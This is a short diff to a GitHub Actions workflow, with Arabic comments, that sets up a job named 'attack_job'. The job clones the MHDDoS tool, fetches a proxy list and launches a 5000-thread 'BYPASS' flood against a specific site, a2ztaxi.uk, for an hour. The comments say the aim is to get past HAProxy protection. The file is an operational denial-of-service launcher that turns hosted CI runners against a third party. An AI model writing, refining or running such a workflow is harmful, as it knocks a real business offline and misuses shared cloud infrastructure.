@@ -5,11 +5,12 @@ jobs:
   attack_job:
     runs-on: ubuntu-latest
     steps:
-      - name: Launch MHDDoS
+      - name: Setup and Launch
         run: |
-          git clone https://github.com
+          # تحميل الأداة وتثبيت المكتبات بسرعة السحاب
+          git clone --depth 1 https://github.com
           cd MHDDoS
           pip3 install -r requirements.txt
-          curl -o proxy.txt https://githubusercontent.com
-          # تشغيل الهجمة بقوة سحابية (5000 Thread) لتجاوز HAProxy
+          curl -s https://githubusercontent.com > proxy.txt
+          # تشغيل الهجمة بقوة 5000 Thread لتجاوز HAProxy
           python3 start.py BYPASS https://a2ztaxi.uk 5 5000 proxy.txt 100 3600
